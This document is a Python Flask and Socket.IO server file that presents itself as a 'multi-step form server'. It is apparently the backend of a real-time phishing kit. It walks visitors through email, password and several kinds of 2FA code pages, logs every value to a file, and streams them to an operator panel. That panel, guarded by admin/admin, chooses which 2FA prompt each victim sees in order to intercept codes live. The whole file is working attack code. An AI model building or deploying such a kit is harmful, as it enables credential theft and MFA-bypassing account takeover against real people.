import argparse
import datetime
import json
import logging
import os
import functools

from flask import (
    Flask, render_template, request, session,
    redirect, url_for, Response, send_from_directory
)
from flask_socketio import SocketIO, emit

# ---------------------------------------------------------------------------
# App setup
# ---------------------------------------------------------------------------
app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['TEMPLATES_AUTO_RELOAD'] = True

# Socket.IO — async_mode 'threading' works without extra deps
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins='*')

# ---------------------------------------------------------------------------
# Logging to file
# ---------------------------------------------------------------------------
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sessions.log')

def log_event(event_type, data):
    entry = {
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
        'event': event_type,
        **data
    }
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(entry) + '\n')

# ---------------------------------------------------------------------------
# Basic auth for admin panel
# ---------------------------------------------------------------------------
ADMIN_USER = 'admin'
ADMIN_PASS = 'admin'

def check_auth(username, password):
    return username == ADMIN_USER and password == ADMIN_PASS

def authenticate():
    return Response(
        'Login required.', 401,
        {'WWW-Authenticate': 'Basic realm="Admin Panel"'}
    )

def requires_auth(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# ---------------------------------------------------------------------------
# Helper — detect mobile user agent
# ---------------------------------------------------------------------------
def is_mobile():
    ua = request.headers.get('User-Agent', '').lower()
    mobile_keywords = ['android', 'iphone', 'ipad', 'mobile', 'webos', 'opera mini']
    return any(kw in ua for kw in mobile_keywords)

# ---------------------------------------------------------------------------
# In-memory session store (simple, single-instance)
# ---------------------------------------------------------------------------
user_sessions = {}  # sid -> {email, password, ip, ua, step}

# ---------------------------------------------------------------------------
# Routes — user facing
# ---------------------------------------------------------------------------

@app.route('/')
def step1():
    """Email / phone input page."""
    return render_template('user/step1.html', mobile=is_mobile())

@app.route('/step2')
def step2():
    """Password input page."""
    return render_template('user/step2.html', mobile=is_mobile())

@app.route('/processing')
def processing():
    """Animated waiting / spinner page."""
    return render_template('user/processing.html', mobile=is_mobile())

@app.route('/step3/<variant>')
def step3(variant):
    """
    2FA code input page.
    variant: sms | auth | prompt | email
    Maps to step3a / step3b / step3c / step3d templates.
    """
    variant_map = {
        'sms':    'user/step3a.html',
        'auth':   'user/step3b.html',
        'prompt': 'user/step3c.html',
        'email':  'user/step3d.html',
        'match':  'user/step3e.html',
    }
    template = variant_map.get(variant, 'user/step3a.html')
    return render_template(template, mobile=is_mobile())

# ---------------------------------------------------------------------------
# Routes — admin panel
# ---------------------------------------------------------------------------

@app.route('/admin')
@requires_auth
def admin_panel():
    """Real-time admin control panel."""
    return render_template('admin/panel.html')

# ---------------------------------------------------------------------------
# Static assets — serve images from static/src
# ---------------------------------------------------------------------------

@app.route('/static/src/<path:filename>')
def serve_src(filename):
    return send_from_directory(os.path.join(app.static_folder, 'src'), filename)

# ---------------------------------------------------------------------------
# Socket.IO events
# ---------------------------------------------------------------------------

@socketio.on('connect')
def handle_connect():
    """Track new connections."""
    sid = request.sid
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'unknown')
    user_sessions[sid] = {'ip': ip, 'ua': ua, 'step': 'connected'}
    log_event('connect', {'sid': sid, 'ip': ip, 'ua': ua})

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    user_sessions.pop(sid, None)
    log_event('disconnect', {'sid': sid})

@socketio.on('join_admin')
def handle_join_admin():
    """Admin joins; we remember the SID for targeted emits."""
    sid = request.sid
    user_sessions[sid] = {'role': 'admin'}
    log_event('admin_join', {'sid': sid})

@socketio.on('submit_step1')
def handle_step1(data):
    """User submits email on step1."""
    sid = request.sid
    email = data.get('email', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'unknown')

    # Update session store
    if sid in user_sessions:
        user_sessions[sid].update({'email': email, 'step': 'step1_done'})

    log_event('submit_step1', {'sid': sid, 'email': email, 'ip': ip})

    # Tell user to move to step2
    emit('goto_step2', {'email': email})

    # Broadcast to all admin clients
    emit('data_received', {
        'email': email,
        'password': '',
        'ip': ip,
        'user_agent': ua,
        'sid': sid,
        'step': 'email_submitted',
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, broadcast=True)

@socketio.on('submit_step2')
def handle_step2(data):
    """User submits password on step2."""
    sid = request.sid
    password = data.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'unknown')

    email = ''
    if sid in user_sessions:
        user_sessions[sid].update({'password': password, 'step': 'step2_done'})
        email = user_sessions[sid].get('email', '')

    log_event('submit_step2', {'sid': sid, 'password': password, 'ip': ip})

    # Tell user to go to processing screen
    emit('show_processing')

    # Broadcast to admin
    emit('data_received', {
        'email': email,
        'password': password,
        'ip': ip,
        'user_agent': ua,
        'sid': sid,
        'step': 'password_submitted',
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, broadcast=True)

@socketio.on('select_variant')
def handle_select_variant(data):
    """Admin selects which step3 variant to show the user."""
    variant = data.get('type', 'sms')  # sms | auth | prompt | email | match
    target_sid = data.get('sid', '')
    number = data.get('number', '')

    log_event('select_variant', {'variant': variant, 'target_sid': target_sid, 'number': number})

    # Broadcast show_step3 to all user clients (they filter by their own SID)
    emit('show_step3', {'variant': variant, 'sid': target_sid, 'number': number}, broadcast=True)

@socketio.on('submit_step3')
def handle_step3(data):
    """User submits verification code on step3."""
    sid = request.sid
    code = data.get('code', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    email = ''
    if sid in user_sessions:
        user_sessions[sid].update({'code': code, 'step': 'step3_done'})
        email = user_sessions[sid].get('email', '')

    log_event('submit_step3', {'sid': sid, 'code': code, 'ip': ip})

    # Broadcast code to admin
    emit('code_received', {
        'code': code,
        'sid': sid,
        'email': email,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, broadcast=True)

    # Show a "verifying" acknowledgement to the user
    emit('code_accepted')

# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Multi-step form server')
    parser.add_argument('--port', type=int, default=5990, help='Port to run on')
    args = parser.parse_args()

    print(f'[*] Starting server on http://0.0.0.0:{args.port}')
    print(f'[*] Admin panel: http://0.0.0.0:{args.port}/admin  (admin/admin)')
    print(f'[*] Session log: {LOG_FILE}')

    socketio.run(app, host='0.0.0.0', port=args.port, debug=True, allow_unsafe_werkzeug=True)
